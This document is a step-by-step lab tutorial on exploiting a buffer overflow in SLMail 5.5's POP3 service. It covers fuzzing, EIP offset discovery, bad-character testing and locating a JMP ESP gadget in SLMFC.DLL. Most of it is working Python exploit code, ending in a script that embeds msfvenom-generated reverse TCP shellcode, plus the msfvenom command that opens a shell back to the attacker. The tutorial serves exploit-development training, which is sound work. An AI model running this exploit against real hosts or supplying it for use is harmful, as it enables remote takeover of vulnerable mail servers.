#### Download and setup

***

_Refer to references at the bottom of the page._

1\. IE8 on Win7(x86)[[^1]].

2\. Mona Py [[^2]].

3\. Seatle Mail 5.5 [[^3]].

4\. Immunity Debugger and python2.7 version that comes with it [[^4]].

5\. Turn off all firewalls and change network settings to “host-only”.

***

POC that we'll be using today.

```python
#!/usr/bin/python
# Attempt to fuzz SLmail.exe

import time, struct, sys
import socket as so

# Buff represents an array of buffers. This will be start at 100 and increment by 200 in order to attempt to crash SLmail.
buff=["A"]

# Maximum size of buffer.
max_buffer = 4000

# Initial counter value.
counter = 100

# Value to increment per attempt.
increment = 200

while len(buff) <= max_buffer:
    buff.append("A"*counter)
    counter=counter+increment

for string in buff:
     try:
        server = str(sys.argv[1])
        port = int(sys.argv[2])
     except IndexError:
        print "[+] Usage example: python %s 192.168.X.X 110" % sys.argv[0]
        sys.exit()
     print "[+] Attempting to crash SLmail at %s bytes" % len(string)
     s = so.socket(so.AF_INET, so.SOCK_STREAM)
     try:
        s.connect((server,port))
        s.recv(1024)
        s.send('USER test\r\n')
        s.recv(1023)
        s.send('PASS ' + string + '\r\n')
        s.send('QUIT\r\n')
        s.close()
     except:
        print "[+] Connection failed."
        sys.exit()
```

![Foo](/images/buffer/9586CB12B285E4C138B1FE132B0EC2BF.jpg)

Fuzzing stops at the 2900th byte, indicating that the 2700th byte was the cause of the crash.

![Foo](/images/buffer/5618B85B182827C7F9FF948DD405DDA3.jpg)

We can see that EIP is 41414141 (which translates from HEX to ASCII as AAAA) and will need to gain control of the EIP register that will then point to our shellcode.

By sending unique strings instead of strings of AAAA, we can identify which four bytes are used to control the EIP register.

As the EIP register acts as a JMP instruction, we can then control what its next step of action will be such as generating a shellcode in SLMail’s buffer.

In Kali and at the prompt, type the following commands to generate 2700 bytes of unique strings.

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <length>
```

![Foo](/images/buffer/8F4A58F9D2653F22BFF11AFC375F0A00.png)

```python
#!/usr/bin/python
import time, struct, sys
import socket as so

pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9"

try:
   server = str(sys.argv[1])
   port = int(sys.argv[2])
except IndexError:
   print "[+] Usage example: python %s 192.168.X.X" % sys.argv[0]
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)
print "\n[+] Attempting to send buffer overflow to SLmail...."
try:
   s.connect((server,port))
   s.recv(1024)
   s.send('USER test' +'\r\n')
   s.recv(1024)
   s.send('PASS ' + pattern + '\r\n')
   print "\n[+] Completed."
except:
   print "[+] Unable to connect to SLmail."
   sys.exit()
```

![Foo](/images/buffer/8B5037C49BA2BB877515A72ECC1D6687.jpg)

The EIP is now 39694438 (9iD8 in ASCII). These 4 bytes are used to gain control of the EIP register.

While we know that the 2700th byte causes a crash of the SLmail service, to identify the exact byte.

To identify the specific byte’s location, launch Kali and type the following command.

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP value>
```


![Foo](/images/buffer/5F81AF8F02AEF31B202EE7D63193F119.jpg)


We know that the exact location that causes the crash is located at _2606_.

```python
#!/usr/bin/python

import time, struct, sys
import socket as so

# 2606 is the location that causes the crash, plus the 4 bytes that is an overflow.
buffer = "A" * 2606 + "B" * 4 + "C" * 90

try:
   server = str(sys.argv[1])
   port = int(sys.argv[2])
except IndexError:
   print "[+] Usage example: python %s 192.168.X.X 110" % sys.argv[0]
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)
print "\n[+] Attempting to send buffer overflow to SLmail...."
try:
   s.connect((server,port))
   s.recv(1024)
   s.send('USER test' +'\r\n')
   s.recv(1024)
   s.send('PASS ' + buffer + '\r\n')
   print "\n[+] Completed."
except:
   print "[+] Unable to connect to SLmail."
   sys.exit()

```

![Foo](/images/buffer/5D718360DE4EE95C18CC28D69866F84D.jpg)

The EIP has now been overwritten from AAAA to BBBB (which is 42424242 in Hex) as a result of the overflow.

By navigating to the ESP’s address (0255A128), we can see where the EIP was overwritten.

Now we need to generate a reverse shell payload 0255A128 but that requires about 350-400 bytes of space.

We have only generated 90 bytes of space.

We will now modify the previous payload used to increase the amount of space needed to generate a shellcode.

```python
#!/usr/bin/python

import time, struct, sys
import socket as so

# we have increased our bytes space from the initial 2700 bytes to 3600 bytes).
buffer = "A" * 2606 + "B" * 4 + "C" * (3600-2606-4)

try:
   server = str(sys.argv[1])
   port = int(sys.argv[2])
except IndexError:
   print "[+] Usage example: python %s 192.168.X.X 110" % sys.argv[0]
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)
print "\n[+] Attempting to send buffer overflow to SLmail...."
try:
   s.connect((server,port))
   s.recv(1024)
   s.send('USER test' +'\r\n')
   s.recv(1024)
   s.send('PASS ' + buffer + '\r\n')
   print "\n[+] Completed."
except:
   print "[+] Unable to connect to SLmail."
   sys.exit()
```

![Foo](/images/buffer/8630F66457D756E34B299BA32B71CD84.jpg)

More space has been allocated for the exploit.

Before we generate the shellcode within the buffer, we will need to see if there are any bad characters that aren’t accepted.

To do so, we will use the badchar list which excludes \\x00 as it is a null byte.

```python
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
```

Let’s modify the previous exploit code to include our bad characters.

```python
#!/usr/bin/python

import time, struct, sys
import socket as so

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffer = "A" * 2606 + "B" * 4 + badchars

try:
   server = str(sys.argv[1])
   port = int(sys.argv[2])
except IndexError:
   print "[+] Usage example: python %s 192.168.X.X 110" % sys.argv[0]
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)
print "\n[+] Attempting to send buffer overflow to SLmail...."
try:
   s.connect((server,port))
   s.recv(1024)
   s.send('USER test' +'\r\n')
   s.recv(1024)
   s.send('PASS ' + buffer + '\r\n')
   print "\n[+] Completed."
except:
   print "[+] Unable to connect to SLmail."
   sys.exit()
```

![Foo](/images/buffer/C7BF40DEE6BBA47DB161E37ADA5A71E5.jpg)

From the ESP register, x0a truncates the rest of the buffer.

We will now modify the payload to remove \\x0a from the payload.

```python
#!/usr/bin/python

import time, struct, sys
import socket as so

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffer = "A" * 2606 + "B" * 4 + badchars

try:
   server = str(sys.argv[1])
   port = int(sys.argv[2])
except IndexError:
   print "[+] Usage example: python %s 192.168.X.X 110" % sys.argv[0]
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)
print "\n[+] Attempting to send buffer overflow to SLmail...."
try:
   s.connect((server,port))
   s.recv(1024)
   s.send('USER test' +'\r\n')
   s.recv(1024)
   s.send('PASS ' + buffer + '\r\n')
   print "\n[+] Completed."
except:
   print "[+] Unable to connect to SLmail."
   sys.exit()
```

![Foo](/images/buffer/2AB29CFE55090E632B8E18861342CEC4.jpg)

We can now identify that \\x0d is another issue. So the bad characters identified are \\x00, \\x0a and \\x0d.

```python
#!/usr/bin/python

import time, struct, sys
import socket as so

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffer = "A" * 2606 + "B" * 4 + badchars

try:
   server = str(sys.argv[1])
   port = int(sys.argv[2])
except IndexError:
   print "[+] Usage example: python %s 192.168.X.X 110" % sys.argv[0]
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)
print "\n[+] Attempting to send buffer overflow to SLmail...."
try:
   s.connect((server,port))
   s.recv(1024)
   s.send('USER test' +'\r\n')
   s.recv(1024)
   s.send('PASS ' + buffer + '\r\n')
   print "\n[+] Completed."
except:
   print "[+] Unable to connect to SLmail."
   sys.exit()
```

We clean up the previous exploit to remove \\x0d and rerun the script.

![Foo](/images/buffer/F6C5FE019C9336E17CBFB12FC2B70CBA.jpg)

To redirect the execution flow so that we are able to cause the application to redirect to the shellcode located at the memory address, we need to find the return address (JMP ESP).

In a nutshell, we want to redirect EIP 42424242 to 024CA128\.

Right click on the disassembly screen or type (CTRL + F) to look for JMP ESP. If there are no results, we need to find the suitable dll that will not have any memory protection such as ASLR and DEP.

In immunity debugger, type **!mona modules**.

Since we’re looking for SLmail’s dll file that has the following options

* Rebase - False
* SafeSEH - False
* ASLR - False
* NXCompat - False
* OS DLL - True

We will use C:\\Windows\\system32\\SLMFC.DLL

![Foo](/images/buffer/03F08C51601DE5FD21AEEDFAE18DCE96.jpg)

Now, to find our operational code for the JMP ESP instruction within the SLMFC.DLL.

Let’s click on “e” within the Immunity Debugger’s menubar or type (Alt +E) on the keyboard.

This will launch the Executable Modules UI within Immunity Debugger.

We now need to look for the JMP ESP code within SLMFC.DLL.

Once the SLMFC.DLL executable module is found, double click on it.

![Foo](/images/buffer/F6D639445E6F2CD0C4225D0E9C4261D8.jpg)

Within the disassembly’s UI, type on the keyboard

`CTRL+F`

-> JMP ESP

`CTRL+S`

-> push esp
-> retn

If it is not present, let’s look for executable instructions within Mona Modules list.

It was found that the SLMFC .text is the only section within the DLL that is marked as an executable.

However, due to the lack of DEP and ASLR within the process, we can use instructions from any loaded sections within the module to look for JMP ESP instructions within the whole SLMFC.DLL process.

![Foo](/images/buffer/C05D0F642B78E0908137B4D3375D3306.jpg)

We will need to find the commands in NASM.

Let’s launch Kali again and type the following commands:

```
locate nasm_shell
ruby /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
```

![Foo](/images/buffer/9FFE31796F4AC3510667846A1FAA2D69.jpg)

We now use mona to find locations of the JMP ESP operation code. Type the following commands:

```
!mona find -s “\xff\xe4” -m SLMFC.DLL
```

![Foo](/images/buffer/CA90F82DDD6DBBDB5F0746858A79F25B.jpg)

Let’s pick the first address, 5F4A358F as it does not contain any bad characters. You can right click on the address \> Copy to clipboard \> Address.

To return to the disassembler screen, click on the **black arrow pointing right in the direction of 4 boxes** before l in the menubar and paste the address.

![Foo](/images/buffer/F620E2078F930515340242161DBD7916.jpg)

We can verify that the JMP ESP operation code is found at this address.

What we need to do now is to redirect the EIP to this address, 5F4A358F at the time of the crash.

A JMP ESP instruction will be executed which will lead to a shell code.

Let’s copy this address and update our exploit while restarting our debugging assignment.

```python
#!/usr/bin/python

import time, struct, sys
import socket as so

# the little endian code will be done in a reverse way due to the way it's stored in memory. Also the address to be changed should be done at "B" as this is the location that causes an overflow in a crash.
buffer = "A" * 2606 + "\x8F\x35\x4A\x5F" + "C" * (3600-2606-4)

try:
   server = str(sys.argv[1])
   port = int(sys.argv[2])
except IndexError:
   print "[+] Usage example: python %s 192.168.X.X 110" % sys.argv[0]
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)
print "\n[+] Attempting to send buffer overflow to SLmail...."
try:
   s.connect((server,port))
   s.recv(1024)
   s.send('USER test' +'\r\n')
   s.recv(1024)
   s.send('PASS ' + buffer + '\r\n')
   print "\n[+] Completed."
except:
   print "[+] Unable to connect to SLmail."
   sys.exit()

```

We need to place a breakpoint at the JMP ESP address before running the exploit above to prevent the process from being executed over and over again.

To return to the disassembler screen, click on the **black arrow pointing right in the direction of 4 boxes** before l in the menubar and paste the address, 5F4A358F.

If it is unsuccessful the first time due to a bug with the debugger, search again for this address.

Once at the address, place a breakpoint (F2) and run the exploit script.

![Foo](/images/buffer/FBDB3725EED959ED5A91755C92809EEF.jpg)

At the time of the crash, the ESP register does point to the beginning of the Cs of our buffer.

Type F7 or navigate to “Step Into” which is the **red arrow to the right** of the pause button within the menubar.

![Foo](/images/buffer/34489AE529ECDB3D89B3D099AB90AC6F.jpg)

Notice that the execution flow has been changed. Any code placed here will be executed.

Now that the execution flow has been modified, we will generate a shellcode for the exploit.

Restart the debugging environment.


### Generating shellcode within the exploit.

***

The exploit should be generated based on your kali’s local address.

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.X.X LPORT=443 -f c -a x86 --platform windows -b '\x00\x0a\x0d\' -e x86/shikata_ga_nai
```

![Foo](/images/buffer/F570A3F802582303DD5FCC1DE8386A9E.jpg)

Using msfvenom to generate the reverse shellcode that disallows the bad characters using the -b parameter.

```python
#!/usr/bin/python

import time, struct, sys
import socket as so

# Take into account of the buffer size (351 bytes) as well and subtract that from the total buffer length.
# Paste the shellcode at the buffer right before the C buffer.

shellcode = ("\xdb\xd8\xb8\x5e\x51\x12\xd0\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x52\x31\x46\x17\x83\xc6\x04\x03\x18\x42\xf0\x25\x58\x8c\x76"
"\xc5\xa0\x4d\x17\x4f\x45\x7c\x17\x2b\x0e\x2f\xa7\x3f\x42\xdc"
"\x4c\x6d\x76\x57\x20\xba\x79\xd0\x8f\x9c\xb4\xe1\xbc\xdd\xd7"
"\x61\xbf\x31\x37\x5b\x70\x44\x36\x9c\x6d\xa5\x6a\x75\xf9\x18"
"\x9a\xf2\xb7\xa0\x11\x48\x59\xa1\xc6\x19\x58\x80\x59\x11\x03"
"\x02\x58\xf6\x3f\x0b\x42\x1b\x05\xc5\xf9\xef\xf1\xd4\x2b\x3e"
"\xf9\x7b\x12\x8e\x08\x85\x53\x29\xf3\xf0\xad\x49\x8e\x02\x6a"
"\x33\x54\x86\x68\x93\x1f\x30\x54\x25\xf3\xa7\x1f\x29\xb8\xac"
"\x47\x2e\x3f\x60\xfc\x4a\xb4\x87\xd2\xda\x8e\xa3\xf6\x87\x55"
"\xcd\xaf\x6d\x3b\xf2\xaf\xcd\xe4\x56\xa4\xe0\xf1\xea\xe7\x6c"
"\x35\xc7\x17\x6d\x51\x50\x64\x5f\xfe\xca\xe2\xd3\x77\xd5\xf5"
"\x14\xa2\xa1\x69\xeb\x4d\xd2\xa0\x28\x19\x82\xda\x99\x22\x49"
"\x1a\x25\xf7\xde\x4a\x89\xa8\x9e\x3a\x69\x19\x77\x50\x66\x46"
"\x67\x5b\xac\xef\x02\xa6\x27\xd0\x7b\x90\xd1\xb8\x79\xe0\x1c"
"\x82\xf7\x06\x74\xe4\x51\x91\xe1\x9d\xfb\x69\x93\x62\xd6\x14"
"\x93\xe9\xd5\xe9\x5a\x1a\x93\xf9\x0b\xea\xee\xa3\x9a\xf5\xc4"
"\xcb\x41\x67\x83\x0b\x0f\x94\x1c\x5c\x58\x6a\x55\x08\x74\xd5"
"\xcf\x2e\x85\x83\x28\xea\x52\x70\xb6\xf3\x17\xcc\x9c\xe3\xe1"
"\xcd\x98\x57\xbe\x9b\x76\x01\x78\x72\x39\xfb\xd2\x29\x93\x6b"
"\xa2\x01\x24\xed\xab\x4f\xd2\x11\x1d\x26\xa3\x2e\x92\xae\x23"
"\x57\xce\x4e\xcb\x82\x4a\x7e\x86\x8e\xfb\x17\x4f\x5b\xbe\x75"
"\x70\xb6\xfd\x83\xf3\x32\x7e\x70\xeb\x37\x7b\x3c\xab\xa4\xf1"
"\x2d\x5e\xca\xa6\x4e\x4b")

buffer = "A" * 2606 + "\x8F\x35\x4A\x5F" + "\x90" * 16 + shellcode + "C" * (3600-2606-4-351-16)

try:
   server = str(sys.argv[1])
   port = int(sys.argv[2])
except IndexError:
   print "[+] Usage example: python %s 192.168.X.X 110" % sys.argv[0]
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)
print "\n[+] Attempting to send buffer overflow to SLmail...."
try:
   s.connect((server,port))
   s.recv(1024)
   s.send('USER test' +'\r\n')
   s.recv(1024)
   s.send('PASS ' + buffer + '\r\n')
   print "\n[+] Completed."
except:
   print "[+] Unable to connect to SLmail."
   sys.exit()

```

Let’s add a few non-operation (NOP) code (x90) at the beginning of the shellcode.

If not, the decoder will override the first few bytes of the shellcode, rendering it useless.

Set the breakpoint at the buffer.

To return to the disassembler screen, click on the **black arrow pointing right in the direction of 4 boxes** before l in the menubar and paste the address, 5F4A358F.

Run the exploit above and you will arrive at the breakpoint, press F7 and step into the next address to start executing the NOP instructions.

![Foo](/images/buffer/AA7CA4AD284171C8E03DA743C32C12DD.jpg)

